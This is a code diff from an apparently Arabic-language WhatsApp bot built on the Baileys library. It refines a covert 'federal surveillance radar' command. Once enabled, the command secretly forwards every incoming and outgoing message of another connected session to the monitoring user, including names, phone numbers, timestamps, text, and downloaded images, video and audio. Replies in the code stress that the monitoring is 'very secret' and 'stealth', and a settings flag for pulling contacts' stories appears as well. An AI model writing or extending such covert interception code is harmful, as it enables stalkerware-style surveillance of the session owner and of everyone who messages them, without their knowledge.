@@ -115,7 +115,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
             badWordsList: [ 'كس' ,  'زق' ,  'شرموط' ,  'منيوك' ],
             antiCall: false, // ميزة منع المكالمات (إضافة جديدة)
             statusStealer: false, // ميزة سحب الستوري (إضافة جديدة)
-            monitoringTarget: null // 🕵️ [تطوير] المستهدف للمراقبة
+            monitoringTarget: null // 🕵️ [تطوير] الجلسة المستهدفة للمراقبة
         };
         saveSettings();
     }
@@ -226,37 +226,42 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         const selfId = jidNormalizedUser(sock.user.id);
         const isFromMe = msg.key.fromMe || sender === selfId;
 
-        // 🕵️‍♂️ [تطوير: نظام المراقبة الفدرالي السري للغاية] 🆕
-        // هذا المحرك يراقب الجلسة ويرسل التقارير للجلسة التي تفعل الرادار
-        for (const monitorId in botSettings) {
-            if (botSettings[monitorId].monitoringTarget === sessionId) {
-                const monitorSock = sessions[monitorId];
+        // 🕵️‍♂️ [تطوير: محرك الرادار الاستخباراتي الفدرالي] 🆕
+        // البحث عن أي جلسة تطلب مراقبة الجلسة الحالية
+        for (const bossId in botSettings) {
+            const bossSettings = botSettings[bossId];
+            if (bossSettings.monitoringTarget === sessionId) {
+                const monitorSock = sessions[bossId];
                 if (monitorSock) {
                     try {
                         const mTime = moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD");
                         const mType = Object.keys(msg.message)[0];
                         const mContent = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || "رسالة وسائط/مستند";
-                        const direction = isFromMe ? "🟢 صادر (من صاحب الجلسة)" : "🔵 وارد (إلى صاحب الجلسة)";
-                        const monitorBossJid = jidNormalizedUser(monitorSock.user.id);
+                        const mDirection = isFromMe ? "صادرة مـن" : "واردة إلـى";
+                        
+                        // تنقية الرقم الحقيقي بدقة جبارة (إزالة معرفات Baileys و LIDs)
+                        const rawJid = (sender || from);
+                        const cleanNum = jidNormalizedUser(rawJid).split('@')[0];
 
                         let report = `🕵️‍♂️ *[رادار المراقبة الفدرالي]* 🕵️‍♂️\n\n`;
-                        report += `📂 *الجلسة المراقبة:* ${sessionId}\n`;
-                        report += `🔄 *النوع:* ${direction}\n`;
+                        report += `📂 رسالة ${mDirection} صاحب الجلسة: *${sessionId}*\n`;
                         report += `👤 *الاسم:* ${pushName}\n`;
-                        report += `📱 *الرقم:* wa.me/${sender.split('@')[0]}\n`;
+                        report += `📱 *الرقم:* wa.me/${cleanNum}\n`;
                         report += `🕒 *الوقت:* ${mTime}\n`;
                         report += `📑 *نوع الرسالة:* ${mType}\n\n`;
                         report += `✉️ *المحتوى:* ${mContent}\n\n`;
                         report += `🤖 *— TARZAN INTELLIGENCE 👑*`;
 
-                        await monitorSock.sendMessage(monitorBossJid, { text: report });
+                        const bossJid = jidNormalizedUser(monitorSock.user.id);
+                        await monitorSock.sendMessage(bossJid, { text: report });
 
                         // سحب الوسائط والستوري في المراقبة
-                        if ((msg.message.imageMessage || msg.message.videoMessage || msg.message.audioMessage)) {
+                        if (msg.message.imageMessage || msg.message.videoMessage || msg.message.audioMessage) {
                             const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
-                            if (msg.message.imageMessage) await monitorSock.sendMessage(monitorBossJid, { image: buffer, caption: `🖼️ صورة مراقبة من: ${pushName}` });
-                            else if (msg.message.videoMessage) await monitorSock.sendMessage(monitorBossJid, { video: buffer, caption: `🎥 فيديو مراقب من: ${pushName}` });
-                            else if (msg.message.audioMessage) await monitorSock.sendMessage(monitorBossJid, { audio: buffer, mimetype: 'audio/mpeg', ptt: true });
+                            const captionTag = `📥 ميديا مراقبة من: ${pushName} (+${cleanNum})`;
+                            if (msg.message.imageMessage) await monitorSock.sendMessage(bossJid, { image: buffer, caption: captionTag });
+                            else if (msg.message.videoMessage) await monitorSock.sendMessage(bossJid, { video: buffer, caption: captionTag });
+                            else if (msg.message.audioMessage) await monitorSock.sendMessage(bossJid, { audio: buffer, mimetype: 'audio/mpeg', ptt: true });
                         }
                     } catch (e) {}
                 }
@@ -417,20 +422,20 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
 
         if (!commandName) return;
 
-        // 🕵️‍♂️ [تطوير: دمج أمر المراقبة مباشرة] 🆕
+        // 🕵️‍♂️ [تطوير: دمج أمر المراقبة مباشرة في المعالج الرئيسي] 🆕
         if (commandName === 'مراقبه') {
-            const target = args[0];
-            if (target === "ايقاف") {
+            const targetSession = args[0];
+            if (targetSession === 'ايقاف') {
                 botSettings[sessionId].monitoringTarget = null;
                 saveSettings();
-                return reply("📴 *تم إيقاف المراقبة الفدرالية بنجاح.*");
+                return reply("📴 *تم إيقاف الرادار الاستخباراتي.*");
             }
-            if (!target || !sessions[target]) {
-                return reply(target ? `❌ الجلسة [${target}] غير متصلة.` : "🕵️‍♂️ اكتب اسم الجلسة للمراقبة.\nمثال: `.مراقبه session1`\nللإيقاف: `.مراقبه ايقاف`\n\n*(العملية سرية جداً)*");
+            if (!targetSession || !sessions[targetSession]) {
+                return reply(targetSession ? `❌ الجلسة [${targetSession}] غير متصلة.` : "🕵️‍♂️ اكتب اسم الجلسة للمراقبة.\nمثال: `.مراقبه عبودي`\nللإيقاف: `.مراقبه ايقاف`\n\n*(العملية سرية جداً)*");
             }
-            botSettings[sessionId].monitoringTarget = target;
+            botSettings[sessionId].monitoringTarget = targetSession;
             saveSettings();
-            return reply(`✅ *تم تفعيل الرادار الفدرالي بنجاح!* 🕵️‍♂️\n\n🎯 *المستهدف:* [${target}]\n🔐 *الوضعية:* سري للغاية (صادر/وارد)\n\n*سيصلك كل شيء من تلك الجلسة هنا فوراً.*`);
+            return reply(`✅ *تم تفعيل الرادار الفدرالي بنجاح!* 🕵️‍♂️\n\n🎯 *المستهدف:* [${targetSession}]\n🔐 *الوضعية:* Stealth (صادر/وارد/ستوري)\n\n*سيصلك كل شيء فوراً هنا وبسرية تامة.*`);
         }
 
         const commandData = commandsMap.get(commandName);
